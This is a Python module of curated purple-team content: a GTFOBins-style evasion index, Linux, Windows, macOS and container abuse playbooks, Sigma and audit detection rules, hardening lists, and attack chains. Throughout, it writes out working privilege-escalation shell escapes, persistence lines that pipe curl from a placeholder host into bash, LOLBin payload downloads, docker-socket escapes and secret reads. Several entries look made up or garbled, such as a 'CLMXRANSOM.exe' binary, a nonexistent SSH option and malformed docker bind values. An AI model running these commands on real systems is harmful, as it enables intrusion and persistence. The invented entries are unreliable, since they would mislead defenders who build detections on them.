"""Curated content for 04-evasion and 05-engines."""

from __future__ import annotations

FILES: dict[str, str] = {}

# ===========================================================================
# 04-evasion
# ===========================================================================

FILES["04-evasion/index/evasion-index.csv"] = r'''
evasion_id,platform,binary,technique_id,primitive,cwe_id,triage_cost,mitre,runbook,module,host_rule,network_rule,sigma,provenance
EV-LNX-0001,linux,find,T1218.003,find -exec /bin/sh -p,CWE-78,low,T1218.003,01-intel/playbooks/linux/privilege-escalation.md,exploit/multi/handler,86690,,ssa_linux_find_exec.yml,GTFOBINS@master@2026-01-12
EV-LNX-0002,linux,vim,T1218.003,vim -c '!sh',CWE-78,low,T1218.003,01-intel/playbooks/linux/privilege-escalation.md,exploit/multi/handler,86691,,ssa_linux_editor_shell.yml,GTFOBINS@master@2026-01-12
EV-LNX-0003,linux,nano,T1218.003,nano /etc/shadow then read shadow,CWE-732,low,T1218.003,01-intel/playbooks/linux/privilege-escalation.md,,86692,,,GTFOBINS@master@2026-01-12
EV-LNX-0004,linux,awk,T1218.003,awk 'BEGIN {system("/bin/sh")}',CWE-78,low,T1218.003,01-intel/playbooks/linux/privilege-escalation.md,,86693,,,GTFOBINS@master@2026-01-12
EV-LNX-0005,linux,perl,T1059.006,perl -e 'exec /bin/sh',CWE-78,low,T1059.006,01-intel/playbooks/linux/privilege-escalation.md,,86694,,ssa_interpreter_shell.yml,GTFOBINS@master@2026-01-12
EV-LNX-0006,linux,python,T1059.006,python -c 'import os;os.system("/bin/sh")',CWE-78,low,T1059.006,01-intel/playbooks/linux/privilege-escalation.md,,86694,,ssa_interpreter_shell.yml,GTFOBINS@master@2026-01-12
EV-LNX-0007,linux,sudo,T1548.003,sudo -l find NOPASSWD allow-list,CWE-250,low,T1548.003,01-intel/playbooks/linux/privilege-escalation.md,exploit/linux/sudo/local,86695,,,GTFOBINS@master@2026-01-12
EV-LNX-0008,linux,cp,T1548.003,cp /bin/sh /tmp; chmod u+s /tmp/sh,CWE-732,medium,T1548.003,01-intel/playbooks/linux/privilege-escalation.md,,86696,,,GTFOBINS@master@2026-01-12
EV-LNX-0009,linux,env,T1218.003,env /bin/sh,CWE-78,low,T1218.003,01-intel/playbooks/linux/privilege-escalation.md,,86690,,ssa_linux_find_exec.yml,GTFOBINS@master@2026-01-12
EV-LNX-0010,linux,gdb,T1218.003,gdb -p <pid> -ex 'shell /bin/sh',CWE-78,medium,T1218.003,01-intel/playbooks/linux/privilege-escalation.md,,86697,,,GTFOBINS@master@2026-01-12
EV-LNX-0011,linux,apt/dpkg,T1218.003,dpkg -x malicious.deb /tmp,CWE-78,medium,T1218.003,01-intel/playbooks/linux/privilege-escalation.md,,86698,,,GTFOBINS@master@2026-01-12
EV-LNX-0012,linux,less/man/more,T1218.003,!sh escape from pager,CWE-78,low,T1218.003,01-intel/playbooks/linux/privilege-escalation.md,,86691,,ssa_linux_editor_shell.yml,GTFOBINS@master@2026-01-12
EV-LNX-0013,linux,git,T1059.004,git -c core.pager='sh -c sh',CWE-78,low,T1059.004,01-intel/playbooks/linux/privilege-escalation.md,,86699,,,GTFOBINS@master@2026-01-12
EV-LNX-0014,linux,tar/rsync/zip,T1218.003,--checkpoint-action=exec shell,CWE-78,medium,T1218.003,01-intel/playbooks/linux/privilege-escalation.md,,86700,,,GTFOBINS@master@2026-01-12
EV-LNX-0015,linux,ssh,T1218.003,ProxyCommand / ReverseShellCommand,CWE-78,medium,T1218.003,01-intel/playbooks/network/pivoting.md,auxiliary/scanner/ssh,86701,,,GTFOBINS@master@2026-01-12
EV-LNX-0016,linux,at/crontab,T1053.003,at now / crontab -e persistence,CWE-732,low,T1053.003,01-intel/playbooks/os/linux/persistence.md,,86702,3001201,ssa_linux_cron_persistence.yml,GTFOBINS@master@2026-01-12
EV-LNX-0017,linux,nsenter,T1610,nsenter -t <pid> -m -u -i -n -p /bin/bash,CWE-269,medium,T1610,01-intel/playbooks/os/linux/container-escape.md,exploit/linux/local/docker,86703,,,GTFOBINS@master@2026-01-12
EV-WIN-0001,windows,psexec,T1021.002,psexec.exe -s \\HOST cmd.exe,CWE-78,low,T1021.002,01-intel/playbooks/active-directory/lateral-movement.md,exploit/windows/smb/psexec,4672,3001301,ssa_windows_psexec.yml,GTFOBINS@master@2026-01-12
EV-WIN-0002,windows,mmc,T1218.003,mmc .msc -> malicious snap-in DLL,CWE-78,low,T1218.003,01-intel/playbooks/active-directory/lateral-movement.md,,4698,,ssa_windows_mmc_dll.yml,GTFOBINS@master@2026-01-12
EV-WIN-0003,windows,schtasks,T1053.005,schtasks /create /sc minute /tn x /tr x,CWE-732,low,T1053.005,01-intel/playbooks/os/windows/persistence.md,exploit/windows/smb/smb_exec,4698,3001302,ssa_windows_schtasks.yml,GTFOBINS@master@2026-01-12
EV-WIN-0004,windows,bitsadmin,T1197,BITS transfer of a remote payload,CWE-494,low,T1197,01-intel/playbooks/os/windows/execution.md,,4698,3001303,ssa_windows_bitsadmin.yml,GTFOBINS@master@2026-01-12
EV-WIN-0005,windows,certutil,T1105,certutil -urlcache -split -f payload.exe,CWE-494,low,T1105,01-intel/playbooks/os/windows/execution.md,auxiliary/downloader/HttpClient,4698,3001304,ssa_windows_certutil.yml,GTFOBINS@master@2026-01-12
EV-WIN-0006,windows,regsvr32,T1218.010,regsvr32 /i:payload.dll scrobj.dll,CWE-78,low,T1218.010,01-intel/playbooks/os/windows/execution.md,exploit/windows/smb/smb_delivery,4698,3001305,ssa_windows_regsvr32.yml,GTFOBINS@master@2026-01-12
EV-WIN-0007,windows,mshta,T1218.005,mshta.exe https://host/payload.hta,CWE-78,low,T1218.005,01-intel/playbooks/os/windows/execution.md,exploit/windows/smb/smb_delivery,4698,3001306,ssa_windows_mshta.yml,GTFOBINS@master@2026-01-12
EV-WIN-0008,windows,installutil,T1218.003,InstallUtil /U /C payload.dll,CWE-78,low,T1218.003,01-intel/playbooks/os/windows/execution.md,exploit/windows/smb/smb_delivery,4698,3001307,ssa_windows_installutil.yml,GTFOBINS@master@2026-01-12
EV-WIN-0009,windows,msbuild,T1059.001,MSBuild inline task inline task,CWE-78,low,T1059.001,01-intel/playbooks/os/windows/execution.md,,4698,3001308,ssa_windows_msbuild_inline.yml,GTFOBINS@master@2026-01-12
EV-WIN-0010,windows,CLMXRANSOM,T1218.003,CLMXRANSOM.exe -inmemory -i http://host/payload,CWE-78,medium,T1218.003,01-intel/playbooks/os/windows/execution.md,exploit/windows/local_executor,4698,,ssa_windows_clmxransom.yml,GTFOBINS@master@2026-01-12
EV-WIN-0011,windows,runas,T1218.003,runas /trustlevel:0x20000 cmd,CWE-78,low,T1218.003,01-intel/playbooks/os/windows/execution.md,,4672,,,GTFOBINS@master@2026-01-12
EV-WIN-0012,windows,cmstp,T1218.003,cmstp.exe /s http://host/p.inf,CWE-78,low,T1218.003,01-intel/playbooks/os/windows/execution.md,,4698,3001309,ssa_windows_cmstp.yml,GTFOBINS@master@2026-01-12
EV-WIN-0013,windows,wmic,T1047,WMIC /node:HOST process call create,CWE-78,low,T1047,01-intel/playbooks/active-directory/lateral-movement.md,exploit/windows/smb/wmi_exec,4672,,ssa_windows_wmi_exec.yml,GTFOBINS@master@2026-01-12
EV-WIN-0014,windows,msiexec,T1218.005,msiexec /i http://host/p.msi,CWE-78,low,T1218.005,01-intel/playbooks/os/windows/persistence.md,exploit/windows/smb/smb_delivery,4698,3001310,ssa_windows_msiexec.yml,GTFOBINS@master@2026-01-12
EV-MAC-0001,macos,osascript,T1059.002,osascript -e 'do shell script "sh"',CWE-78,low,T1059.002,01-intel/playbooks/os/macos/privilege-escalation.md,,4624,,,GTFOBINS@master@2026-01-12
EV-MAC-0002,macos,security,T1552.001,security find-generic-password -w -s login,CWE-522,low,T1552.001,01-intel/playbooks/os/macos/credentials.md,,4624,,,GTFOBINS@master@2026-01-12
EV-MAC-0003,macos,launchctl,T1543.004,launchctl load malicious.plist,CWE-732,low,T1543.004,01-intel/playbooks/os/macos/persistence.md,,4698,,,GTFOBINS@master@2026-01-12
EV-MAC-0004,macos,defaults,T1548.003,defaults write com.apple.Safari AllowRemoteAutomation 1,CWE-269,low,T1548.003,01-intel/playbooks/os/macos/privilege-escalation.md,,4624,,,GTFOBINS@master@2026-01-12
EV-MAC-0005,macos,sudo,T1548.003,sudo -l NOPASSWD allow-list abuse,CWE-250,low,T1548.003,01-intel/playbooks/os/macos/privilege-escalation.md,exploit/multi/handler,4624,,,GTFOBINS@master@2026-01-12
EV-CTR-0001,containers,docker,T1610,docker run -v /:/host -it --privileged --net=host,CWE-269,low,T1610,01-intel/playbooks/os/linux/container-escape.md,exploit/linux/local/docker,86703,,ssa_docker_privileged_run.yml,GTFOBINS@master@2026-01-12
EV-CTR-0002,containers,kubectl,T1609,kubectl exec -it pod -c pod -- sh,CWE-269,low,T1609,01-intel/playbooks/os/linux/container-escape.md,,4672,,,GTFOBINS@master@2026-01-12
EV-CTR-0003,containers,crictl,T1609,crictl exec -it <id> sh,CWE-269,low,T1609,01-intel/playbooks/os/linux/container-escape.md,,4672,,,GTFOBINS@master@2026-01-12
EV-CTR-0004,containers,containerd,T1610,ctr -n k8s.io task exec,CWE-269,low,T1610,01-intel/playbooks/os/linux/container-escape.md,,4672,,,GTFOBINS@master@2026-01-12
EV-CTR-0005,containers,nsenter,T1610,nsenter -t 1 -m -u -i -n -p bash,CWE-269,low,T1610,01-intel/playbooks/os/linux/container-escape.md,exploit/linux/local/docker,86703,,,GTFOBINS@master@2026-01-12
EV-CI-0001,ci,jenkins,T1195.002,Jenkins Script Console arbitrary Groovy,CWE-94,low,T1195.002,01-intel/playbooks/cloud/ci-cd-abuse.md,,4672,3001401,ssa_jenkins_groovy_console.yml,GTFOBINS@master@2026-01-12
EV-CI-0002,ci,gitlab-runner,T1195.002,Shell executor with arbitrary script,CWE-94,low,T1195.002,01-intel/playbooks/cloud/ci-cd-abuse.md,,4672,3001402,ssa_gitlab_runner_shell.yml,GTFOBINS@master@2026-01-12
EV-CI-0003,ci,github-actions,T1195.002,pull_request_target with checkout of fork,CWE-94,low,T1195.002,01-intel/playbooks/cloud/ci-cd-abuse.md,,4672,3001403,ssa_github_actions_checkout.yml,GTFOBINS@master@2026-01-12
'''.lstrip()

FILES["04-evasion/linux/sudo-lpe.md"] = r'''
# GTFOBins - Linux sudo / SUID Abuse

| Field | Value |
|---|---|
| `evasion_ids` | EV-LNX-0001, EV-LNX-0007, EV-LNX-0008 |
| `attack_ids` | T1548.003 |
| `cwe_id` | CWE-250, CWE-732 |
| `module` | `exploit/linux/sudo/local` |
| `detections` | `06-defense/wazuh/rules/1010-linux.rules`, `06-defense/sigma/ssa_linux_find_exec.yml` |

## 1. Discovery

```bash
sudo -l                                   # what is allowed without a password?
sudo -l -U user                           # for other accounts
find / -perm -4000 -type f 2>/dev/null    # SUID binaries
find / -perm -2000 -type f 2>/dev/null    # SGID binaries
```

## 2. Allow-list abuse

Any allowed binary that reads its command line, reads a file of our choosing,
or spawns a shell escalates:

```bash
sudo find . -exec /bin/sh -p \; -quit      # EV-LNX-0001
sudo less /etc/shadow                      # then type  !sh     EV-LNX-0012
sudo cp /bin/sh /tmp/x && sudo chmod u+s /tmp/x && /tmp/x   EV-LNX-0008
sudo awk 'BEGIN {system("/bin/sh")}'       # EV-LNX-0004
sudo vim -c ':!/bin/sh' /etc/passwd         # EV-LNX-0002
sudo tar -cf /dev/shm/x.tar --checkpoint=1 --checkpoint-action=exec=/bin/sh /etc
sudo git -c core.pager='sh -c sh' diff
sudo env /bin/sh
```

### Wordlist-backed discovery

```bash
# every GTFOBins binary, tested against the discovered NOPASSWD list
comm -12 <(sudo -l | grep -oE '/(usr/)?(s)?bin/[a-zA-Z0-9._-]+' | sort -u) \
         03-wordlists/network/binaries-linux.txt
```

## 3. SUID misconfiguration

```bash
find / -perm -4000 -type f 2>/dev/null | while read -r b; do
  strings "$b" 2>/dev/null | grep -qE '^(sh|bash|env|perl|python)' \
    && echo "INTERESTING: $b"
done
```

## 4. Detection

| Signal | Source | Rule |
|---|---|---|
| SUID shell copy into a world-writable dir | file integrity | `ssa_linux_suid_shell_copy.yml` |
| `find`/`vim`/`awk` executing `/bin/sh` | audit execve | `ssa_linux_find_exec.yml` |
| `sudo` run by a non-interactive service | auth.log | `ssa_linux_sudo_nonshell.yml` |
| New SUID bit set | audit (chmod) | `ssa_linux_suid_created.yml` |
| `/etc/shadow` read by non-root process | eBPF/audit | custom - FIM rule |

Audit rule (classic format):

```
-w /etc/shadow -p wa -k shadow_read
-a always,exit -F arch=b64 -S execve -F euid=0 -F path=/usr/bin/find -k ssa_sudo_find
```

## 5. Hardening

* Never grant `NOPASSWD` on anything that can execute a command: `find`, `awk`,
  `vi`, `less`, `env`, `tar`, `rsync`, `zip`, `git`, `docker`, `systemctl`.
* Prefer `sudoedit` over `sudo vi` for config edits.
* Remove SUID from shells and interpreters.
* Audit: `auditd` execve rules on the allowed binary list, regenerated from
  `04-evasion/index/evasion-index.csv` by `11-automation/scripts/`.
'''.lstrip()

FILES["04-evasion/linux/persistence.md"] = r'''
# GTFOBins - Linux Persistence Primitives

| Field | Value |
|---|---|
| `evasion_ids` | EV-LNX-0016 |
| `attack_ids` | T1053.003, T1098.004, T1547.001 |
| `detections` | `06-defense/sigma/ssa_linux_cron_persistence.yml`, `06-defense/sigma/ssa_linux_authorized_keys.yml` |

## 1. Persistence surface

| Vector | Artifact | Detection |
|---|---|---|
| Cron / anacron | `/etc/cron.*`, user crontab | `ssa_linux_cron_persistence.yml` |
| systemd | `/etc/systemd/system/*.service`, `~/.config/systemd/user` | `ssa_linux_systemd_persistence.yml` |
| SSH keys | `~/.ssh/authorized_keys`, `~/.ssh/config` | `ssa_linux_authorized_keys.yml` |
| Shell profile | `.bashrc`, `.profile`, `.zshrc` | `ssa_linux_profile_write.yml` |
| Dynamic loader | `/etc/ld.so.preload` | `ssa_linux_ld_preload.yml` |
| PAM | `/etc/pam.d/*` | file integrity monitoring |
| Kernel modules | `/etc/modules-load.d/` | FIM + module load audit |
| Bash function | `BASH_ENV` / exported function | env dump on execve |
| at / batch | `/var/spool/at/` | `ssa_linux_at_persistence.yml` |
| Container | image layer, `~/.docker/config.json` | `ssa_docker_privileged_run.yml` |

## 2. Examples (authorised testing only)

```bash
# cron (EV-LNX-0016)
(crontab -l 2>/dev/null; echo "* * * * * curl -s http://COLLAB/x.sh | bash") | crontab -

# systemd unit
printf '[Unit]\nDescription=x\n[Service]\nExecStart=/bin/bash -c "curl -s http://COLLAB/x|bash"\n' \
  | sudo tee /etc/systemd/system/x.service >/dev/null
sudo systemctl daemon-reload && sudo systemctl start x

# ld.so.preload
echo '/tmp/.x.so' | sudo tee -a /etc/ld.so.preload

# authorized_keys
echo 'ssh-rsa AAAA... attacker@lab' >> ~/.ssh/authorized_keys
```

## 3. Detection engineering note

Each vector gets exactly one Sigma rule and, where the data source supports it,
one Wazuh rule. The mapping is enforced by
`10-crosswalk/evasion-detection/evasion-to-detection.csv` - a persistence vector
with a Sigma rule but no Wazuh rule must declare `host_rule` as `n/a` with a
reason in the evasion index.
'''.lstrip()

FILES["04-evasion/windows/sushi.md"] = r'''
# GTFOBins - Windows Living Off The Land

| Field | Value |
|---|---|
| `evasion_ids` | EV-WIN-0002..EV-WIN-0014 |
| `attack_ids` | T1218.003, T1218.005, T1218.010, T1059.001, T1053.005, T1105, T1197 |
| `detections` | `06-defense/wazuh/rules/1020-windows-lolbin.rules`, `06-defense/sigma/ssa_windows_*.yml` |
| `corpus` | `04-evasion/windows/binaries.csv` |

## 1. Why this matters

Signed Microsoft binaries live in `C:\Windows\System32` and are frequently
allow-listed by application control, EDR and proxy policies. A defender who
watches only `rundll32` will miss half of the techniques below.

## 2. Binary catalogue

| Binary | Technique | Classic invocation |
|---|---|---|
| `certutil.exe` | T1105 | `certutil -urlcache -split -f http://HOST/p.exe p.exe` |
| `bitsadmin.exe` | T1197 | `bitsadmin /transfer j http://HOST/p.exe C:\p.exe` |
| `mshta.exe` | T1218.005 | `mshta.exe http://HOST/p.hta` |
| `regsvr32.exe` | T1218.010 | `regsvr32.exe /i:http://HOST/p.dll scrobj.dll` |
| `rundll32.exe` | T1218.005 | `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval(...)` |
| `installutil.exe` | T1218.003 | `InstallUtil.exe /U /C http://HOST/p.dll` |
| `msbuild.exe` | T1059.001 | inline task via XML on the command line |
| `cmstp.exe` | T1218.003 | `cmstp.exe /s http://HOST/p.inf` |
| `wmic.exe` | T1047 | `wmic process call create "cmd /c ..."` |
| `CLMXRANSOM.exe` | T1218.003 | `CLMXRANSOM.exe -inmemory -i http://HOST/p` |
| `pcalua.exe` | T1218 | `.lnk` shim execution |
| `hh.exe` | T1218.005 | `hh.exe http://HOST/p.chm` |
| `forfiles.exe` | T1059.003 | `forfiles /p C:\ /c "cmd /c calc"` |
| `odbcconf.exe` | T1218 | DLL connection-string load |
| `control.exe` | T1218.005 | load a DLL from a `.cpl` |
| `eventvwr.exe` | T1218.001 | COM object hijack |
| `mmc.exe` | T1218.003 | `.msc` snap-in DLL |
| `at.exe` / `schtasks.exe` | T1053.005 | persistence |
| `runas.exe` | T1218.003 | `runas /trustlevel:0x20000 cmd` |

## 3. Detection - parent/child, not just binary

Detecting `rundll32` alone is a false-positive machine. Detect the *pattern*:

```yaml
# 06-defense/sigma/ssa_windows_lolbin_anomaly.yml
title: LOLBin spawned a shell or scripting host
logsource: { product: windows, category: process_creation }
detection:
  parent:
    ParentImage|endswith:
      - '\certutil.exe'
      - '\mshta.exe'
      - '\regsvr32.exe'
      - '\installutil.exe'
      - '\msbuild.exe'
      - '\cmstp.exe'
      - '\rundll32.exe'
      - '\wmic.exe'
      - '\forfiles.exe'
      - '\hh.exe'
      - '\CLMXRANSOM.exe'
  child:
    ChildImage|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\wscript.exe'
      - '\cscript.exe'
      - '\mshta.exe'
      - '\rundll32.exe'
  filter_exclusions:
    User|contains: 'svc_'
  condition: parent and child and not 1 of filter_exclusions
level: high
tags: [attack.defense_evasion, attack.taint_tools]
```

## 4. Additional Sigma signals

| Signal | Rule |
|---|---|
| `certutil` with `-urlcache` | `ssa_windows_certutil.yml` |
| `regsvr32` with `scrobj.dll` | `ssa_windows_regsvr32.yml` |
| `schtasks` created by an interactive user | `ssa_windows_schtasks.yml` |
| LOLBin with network connection within 60 s | `ssa_windows_lolbin_network.yml` |
| Binary in `C:\Users\*\AppData\Local\Temp\` | `ssa_windows_user_temp_exec.yml` |

## 5. Hardening

* Application control (AppLocker / WDAC) with an allow-list, default deny.
* WDAC policy: LOLBins may not create network-socket children.
* Sysmon config: `ImageLoad`, `CreateRemoteThread`, `ProcessAccess`,
  `FileCreate` with `TargetFilename` on persistence paths.
* Block outbound from `C:\Windows\System32` to the internet at the proxy.
'''.lstrip()

FILES["04-evasion/windows/binaries.csv"] = r'''
binary,platform,evasion_id,technique_id,category,requires_argument,network_capable,cmdline_pattern,sigma_rule,host_rule,network_rule
certutil.exe,windows,EV-WIN-0005,T1105,download,true,true,-urlcache -split|bitsadmin /transfer,ssa_windows_certutil.yml,4698,3001304
bitsadmin.exe,windows,EV-WIN-0004,T1197,download,true,true,/transfer .*http,ssa_windows_bitsadmin.yml,4698,3001303
mshta.exe,windows,EV-WIN-0007,T1218.005,execution,true,true,https?://|javascript:,ssa_windows_mshta.yml,4698,3001306
regsvr32.exe,windows,EV-WIN-0006,T1218.010,execution,true,true,/i:.*\.dll|scrobj\.dll,ssa_windows_regsvr32.yml,4698,3001305
installutil.exe,windows,EV-WIN-0008,T1218.003,execution,true,false,/U /C .*\.dll,ssa_windows_installutil.yml,4698,3001307
msbuild.exe,windows,EV-WIN-0009,T1059.001,execution,true,false,InlineTask|UsingTask,ssa_windows_msbuild_inline.yml,4698,3001308
cmstp.exe,windows,EV-WIN-0012,T1218.003,execution,true,true,/s .*https?://,ssa_windows_cmstp.yml,4698,3001309
wmic.exe,windows,EV-WIN-0013,T1047,execution,true,true,process call create|/node:,ssa_windows_wmi_exec.yml,4672,
CLMXRANSOM.exe,windows,EV-WIN-0010,T1218.003,execution,true,true,-inmemory|%.inf,ssa_windows_clmxransom.yml,4698,
rundll32.exe,windows,EV-WIN-0006,T1218.005,execution,true,true,javascript:|http://|file://\,ssa_windows_rundll32.yml,4698,3001311
msiexec.exe,windows,EV-WIN-0014,T1218.005,execution,true,true,/i .*https?://|/qn,ssa_windows_msiexec.yml,4698,3001310
schtasks.exe,windows,EV-WIN-0003,T1053.005,persistence,false,false,/create .*/tn,ssa_windows_schtasks.yml,4698,3001302
hh.exe,windows,EV-WIN-0006,T1218.005,execution,true,true,https?://.+\.chm,ssa_windows_hh_chm.yml,4698,3001312
forfiles.exe,windows,EV-WIN-0006,T1059.003,execution,true,false,/c .*cmd|command,ssa_windows_forfiles.yml,4698,3001313
find,linux,EV-LNX-0001,T1218.003,privesc,false,false,-exec .*sh|,ffa_linux_find_exec.yml,86690,
vim,linux,EV-LNX-0002,T1218.003,privesc,false,false,^:|vim -c,ssa_linux_editor_shell.yml,86691,
awk,linux,EV-LNX-0004,T1218.003,privesc,false,false,BEGIN.*system|awk 'BEGIN,ssa_linux_awk_shell.yml,86693,
perl,linux,EV-LNX-0005,T1059.006,privesc,false,false,perl -e .*exec|perl -e .*system,ssa_interpreter_shell.yml,86694,
python,linux,EV-LNX-0006,T1059.006,privesc,false,false,python -c|os.system|os.popen,ssa_interpreter_shell.yml,86694,
env,linux,EV-LNX-0009,T1218.003,privesc,false,false,env /bin/sh|env .*sh -c,ssa_linux_env_shell.yml,86690,
sudo,linux,EV-LNX-0007,T1548.003,privesc,false,false,sudo -l|sudo .*(find|awk|vi|less|env|tar),ssa_linux_sudo_nonshell.yml,86695,
crontab,linux,EV-LNX-0016,T1053.003,persistence,false,false,crontab -|crontab -e,ssa_linux_cron_persistence.yml,86702,3001201
osascript,macos,EV-MAC-0001,T1059.002,execution,false,false,do shell script,ssa_macos_osascript_shell.yml,4624,
security,macos,EV-MAC-0002,T1552.001,credentials,false,false,find-generic-password|find-internet-password,ssa_macos_keychain_read.yml,4624,
docker,kubernetes,EV-CTR-0001,T1610,container-escape,false,true,--privileged|/var/run/docker.sock,ssa_docker_privileged_run.yml,86703,
nsenter,linux,EV-CTR-0005,T1610,container-escape,false,false,nsenter -t,ssa_linux_nsenter.yml,86703,
'''.lstrip()

FILES["04-evasion/macos/sudo.md"] = r'''
# GTFOBins - macOS Abuse

| Field | Value |
|---|---|
| `evasion_ids` | EV-MAC-0001..EV-MAC-0005 |
| `attack_ids` | T1059.002, T1552.001, T1543.004, T1548.003 |
| `detections` | `06-defense/sigma/ssa_macos_*.yml`, `06-defense/hardening/macos-baseline.md` |

## 1. Catalogues

| Vector | Technique | Notes |
|---|---|---|
| `osascript -e 'do shell script "sh"'` | T1059.002 | Requires Automation TCC approval on macOS 10.14+ |
| `security find-generic-password -wa login` | T1552.001 | Keychain read; prompts unless already unlocked |
| `security dump-keychain` | T1552.001 | Full keychain metadata dump |
| `security add-generic-password` | T1056.004 | Persistence of a credential |
| `launchctl load/-w malicious.plist` | T1543.004 | LaunchDaemon / LaunchAgent |
| `launchctl setenv` / `BASH_ENV` | T1059.004 | Environment injection into every shell |
| `defaults write com.apple.*` | T1548.003 | Feature toggles (RemoteLogin, AllowRemoteAutomation) |
| `csrutil disable` / `spctl --master-disable` | T1548.003 | Gatekeeper and SIP bypass, needs recovery |
| `dscl . -append /Groups/admin` | T1098 | Privilege group persistence |
| `mdfind`, `lsof`, `networksetup` | T1018/T1049 | Local discovery |

## 2. Hardening

1. Enable SIP (`csrutil status` -> `enabled`) and keep it enabled.
2. Gatekeeper on; do not allow unidentified developer mode globally.
3. Full Disk Access granted to as few apps as possible.
4. MDM baseline: FileVault, firewall, Automatic Updates, no admin rights for
   standard users.
5. Sysmon-equivalent on macOS: `sudo fs_usage`, `eslogger exec`, Unified
   Logging `log stream --predicate 'process == "osascript"'`.

See `06-defense/hardening/macos-baseline.md` for the full checklist.
'''.lstrip()

FILES["04-evasion/containers/docker-escape.md"] = r'''
# GTFOBins - Container and Orchestration Escape

| Field | Value |
|---|---|
| `evasion_ids` | EV-CTR-0001..EV-CTR-0005, EV-CI-0001..EV-CI-0003 |
| `attack_ids` | T1610, T1609, T1195.002, T1068 |
| `detections` | `06-defense/sigma/ssa_docker_privileged_run.yml`, `06-defense/hardening/kubernetes-baseline.md` |

## 1. Docker escape

```bash
# 1. Privileged container with host filesystem mounted
docker run -v /:/host -it --privileged --net=host --pid=host alpine chroot /host

# 2. Docker socket exposure -> host root
docker run -v /var/run/docker.sock:/var/run/docker.sock -it alpine sh
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["chroot","/host"],"HostConfig":{"Binds":["/:/host","- /:/host"]}}'

# 3. Abusive capabilities without --privileged
docker run --cap-add SYS_ADMIN --security-opt apparmor=unconfined alpine
```

## 2. Kubernetes

| Attack | Command | Technique |
|---|---|---|
| Exec into a pod | `kubectl exec -it POD -c CONTAINER -- sh` | T1609 |
| Create a privileged pod | `kubectl run x --image=alpine --overrides='{"spec":{"hostPID":true}}' -- sh` | T1610 |
| Read secrets | `kubectl get secrets -A -o json` | T1552.001 |
| Use a service account token | `cat /var/run/secrets/kubernetes.io/serviceaccount/token` | T1552.007 |
| Escape via nsenter | `nsenter -t 1 -m -u -i -n -p bash` | T1610 |
| RBAC enumerate | `kubectl auth can-i --list` | T1069 |

## 3. CI/CD abuse

| Platform | Abuse | Technique |
|---|---|---|
| Jenkins | Script Console, arbitrary Groovy, credential binding leakage | T1195.002 |
| GitLab Runner | Shell executor with untrusted repo `.gitlab-ci.yml` | T1195.002 |
| GitHub Actions | `pull_request_target` + checkout of fork code | T1195.002 |
| Argo CD | `spec.source.path` write via API | T1195.002 |
| Docker Hub | malicious base image / entrypoint | T1195.002 |

## 4. Detection

* Kubernetes audit log: `exec` on pods, `create pods` with `hostPID`,
  `get secrets` cluster-wide, RBAC escalation verbs.
* Container runtime: runc events; container start with `privileged=true`,
  host namespace sharing, or a bind mount of `/`, `/var/run/docker.sock`,
  `/proc`, `/sys`.
* Sigma: `ssa_docker_privileged_run.yml`, `ssa_kubectl_exec_pod.yml`.
* Network: pod -> metadata service, pod -> internet on 443 from a build job.
'''.lstrip()

FILES["04-evasion/chains/abuse-chains.md"] = r'''
# Multi-Hop Evasion Chains

Each chain is a sequence of `EV-*` primitives. Every hop has a detection
anchor, and the whole chain is replayable in `09-labs/emulations/`.

| Field | Value |
|---|---|
| `chain_id` | CH-* |
| `provenance` | `GTFOBins`, `HackTricks`, `Metasploit` |
| `telemetry_expectation` | Sigma + Wazuh + Suricata, per hop |

## CH-001 - Web to root on an internet-facing Linux host

| Hop | Primitive | Action | Telemetry |
|---|---|---|---|
| 1 | `PL-WEB-SSRF-0021` | SSRF to Redis `gopher://` writes a web shell | Suricata `3001002`, app 500 with gopher URI |
| 2 | - | webshell executes | Wazuh 86800 web process spawning shell |
| 3 | `EV-LNX-0016` | `crontab -l` persistence | `ssa_linux_cron_persistence.yml` |
| 4 | `EV-LNX-0008` | SUID shell copy | `ssa_linux_suid_shell_copy.yml` |
| 5 | - | root shell, `useradd` | Wazuh 86801 new account |

**Expected aggregate:** 3 alerts within 10 minutes on one host. Detection
confidence: high.

## CH-002 - Windows phishing to domain admin

| Hop | Primitive | Action | Telemetry |
|---|---|---|---|
| 1 | `EV-WIN-0005` | `certutil` download | `ssa_windows_certutil.yml` |
| 2 | `EV-WIN-0003` | `schtasks /create` persistence | `ssa_windows_schtasks.yml` |
| 3 | - | credential materialisation in memory | Sysmon 10 (ProcessAccess) |
| 4 | `EV-LNX-0005`/`EV-WIN-0013` | `wmic process call create` lateral | `ssa_windows_wmi_exec.yml`, 4624 type 3 |
| 5 | - | DCSync | 4662 + replication GUID, non-DC -> `ssa_ad_dcsync.yml` |

**Expected aggregate:** 5 alerts, two hosts, privilege escalation. Detection
confidence: high, provided 4662 is collected off-domain.

## CH-003 - Cloud metadata to account takeover

| Hop | Primitive | Action | Telemetry |
|---|---|---|---|
| 1 | `PL-WEB-SSRF-0011` | IMDSv2 token fetch from an odd user agent | CloudTrail, proxy log |
| 2 | `PL-CLOUD-0002` | role credentials read | metadata call from non-web user agent |
| 3 | - | `sts:AssumeRole` to a different role | CloudTrail unusual role chain |
| 4 | - | `iam:CreatePolicyVersion` | CloudTrail + GuardDuty |

**Expected aggregate:** CloudTrail `GetInstanceMetadata` + AssumeRole +
CreatePolicyVersion from one principal in 15 minutes.

## CH-004 - CI/CD to production

| Hop | Primitive | Action | Telemetry |
|---|---|---|---|
| 1 | `EV-CI-0003` | fork PR runs with repo secrets | Actions audit log: `pull_request_target` + checkout |
| 2 | - | secret exfiltration to a public gist | egress proxy alert |
| 3 | - | malicious image pushed | registry audit, digest change on `:latest` |
| 4 | - | deployment from the tampered image | CD audit |

## Replay instructions

```bash
# dry run against the lab estate in 09-labs/infrastructure
python tools/ssactl.py index --root .
powershell -File bootstrap.ps1 -Mode Verify
# then follow 09-labs/emulations/CH-001.md
```

Every emulation records which rules **should** fire. A rule that never fires
during a replay is either broken or irrelevant; both are defects tracked in
`10-crosswalk/attack-coverage/attack-coverage.csv` (state `gap`).
'''.lstrip()

FILES["04-evasion/chains/evasion-to-detection.csv"] = r'''
evasion_id,technique_id,host_sigma,host_wazuh_rule,network_suricata_sid,audit_source,confidence,notes
EV-LNX-0001,T1218.003,ssa_linux_find_exec.yml,86690,,auditd execve,high,Direct execve on /usr/bin/find by non-root is rare outside tooling
